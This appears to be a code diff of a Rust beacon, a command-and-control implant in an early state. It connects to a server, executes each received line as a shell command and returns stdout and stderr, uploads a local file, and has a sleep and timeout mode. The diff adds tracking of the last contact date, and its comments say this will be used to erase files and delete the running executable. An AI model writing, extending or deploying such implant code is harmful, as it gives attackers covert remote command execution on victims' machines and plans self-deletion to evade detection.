@@ -4,6 +4,7 @@
 use std::process::Command;
 use std::io::BufReader;
 use std::io::BufRead;
+use std::fs::OpenOptions;
 use std::io::BufWriter;
 use std::io::Write;
 use std::net::SocketAddr;
@@ -12,7 +13,10 @@ use std::net::{Shutdown, TcpStream};
 use std::time::{Duration, Instant};
 use std::fs::File;
 use std::io::prelude::*;
+use std::env;
+use chrono::prelude::*;
 
+///used to set the timeout to stop the beacon 
 const TIMEOUT:u64=60;
 //use std::os::unix::net::SocketAddr;
 
@@ -23,6 +27,10 @@ struct Resultat{
     stdout: String,
     stderr: String,
 }
+
+
+
+
 
 /// Create a new Resultat
 fn create_resultat(status: String, stdout: String, stderr: String) -> Resultat{
@@ -53,6 +61,17 @@ fn execute_commands(command: &str) -> Resultat {
     let e = String::from_utf8_lossy(&output.stderr).to_string();   
     let results = create_resultat(s, o, e);
     results
+}
+
+/// upload the last interaction date. Hence we can say how much time has passed since the last interaction => when to erase all the files
+fn upload_date(stream: &str){
+    println!("upload de la date");
+    let mut file = OpenOptions::new()
+        .write(true)
+        .append(true)
+        .open("src/date.txt")
+        .unwrap();
+    writeln!(file,"{}",stream).expect("Unable to write file");
 }
 
 
@@ -105,44 +124,60 @@ fn upload_file(stream: &mut TcpStream, path: &str) {
 fn main(){
 
     let addr = "127.0.0.1:3333";
-    let mut stream = TcpStream::connect(addr).unwrap(); // connect to server
-    println!("Server connecting on addr {}",addr);
+    let mut stream = TcpStream::connect(addr);
+    match stream {
+        Ok(stream) => unsafe {
+                    println!("Server connecting on addr {}",addr);
+            /// get time when executing the function main and check if {{limitTime}} has passed since last communications
+            
 
+
+            duration_before_shutdown(&mut stream.try_clone().unwrap(), 60);
+            upload_file(&mut stream.try_clone().unwrap(), "src/uploadFile.txt");
+
+            let mut reader = BufReader::new(&stream);
+            let mut writer = &stream;
+            let mut line = String::new();
+
+            /// finds the path to the exe we are running => 
+            ///will be used to delete it (remove current exe) and print("failed to ....") error if not found
+            let exe_path = env::current_exe().expect("failed to ....");
+            println!("{}", exe_path.display());
+            let utc: DateTime<Utc> = Utc::now(); 
+            upload_date(&format!("{}",utc));
+
+
+            let lines_server = reader.lines().fuse();
+            for l in lines_server {
+                line = l.unwrap();
+                if line.contains("command") | line.contains("target"){
+
+                }
+                if line.contains("sleep"){
+                    println!("exectue sleep function");
+                    sleep_beacon(10000);
+                }else{ 
+                    /*line.contains("command") | line.contains("target") {*/
+                    let mut response = String::from("response:");
+                    let command = get_command(line.trim()); // return the command input without "command" and "target"
+                    println!("command receive is : {}", command);
+                    let results = execute_commands(&command);
+                    println!("result of the command : {}", results.stdout);
+                    response.push_str(&results.status);
+                    response.push_str(" stdout : ");
+                    response.push_str(&results.stdout);
+                    response.push_str(" stderr : ");
+                    response.push_str(&results.stderr);
+                    println!("{}", response);
+                    writer.write_all(response.as_bytes()).unwrap();
+                    //list_result_command.push(results);
+                }
+            }
+        } Err(e) => {
+            println!("Error:  {}",e);
+        }
+    } 
     
-    duration_before_shutdown(&mut stream, 60); //beacon will be shutdown after 60 sec if it doesn't receive informations
-
-    let mut reader = BufReader::new(&stream); // struct adds buffering to any reader.
-    let mut writer = &stream;
-    let mut line = String::new();
-    let lines_server = reader.lines().fuse(); // an iterator over the lines of an instance of BufRead
-
-
-    for l in lines_server {
-        line = l.unwrap();  // error handling
-        let mut stream2 = stream.try_clone().unwrap();
-
-        if line.contains("upload"){
-            upload_file(&mut stream2, "src/uploadFile.txt"); //
-        }
-        if line.contains("sleep"){
-            println!("exectue sleep function");
-            sleep_beacon(10000);
-        }else{ 
-            let mut response = String::from("response:");   // the response string should be sent to the server
-            let command = get_command(line.trim());     // return the command input without "command" and "target"
-            println!("command receive is : {}", command);
-            let results = execute_commands(&command);   // execute the commands
-            println!("result of the command : {}", results.stdout);    // print the results
-            /// add results to the response string
-            response.push_str(&results.status); 
-            response.push_str(" stdout : ");
-            response.push_str(&results.stdout);
-            response.push_str(" stderr : ");
-            response.push_str(&results.stderr);
-            println!("{}", response);   // print the response
-            writer.write_all(response.as_bytes()).unwrap(); // write the response in the server
-        }
-    }
     
 
 }
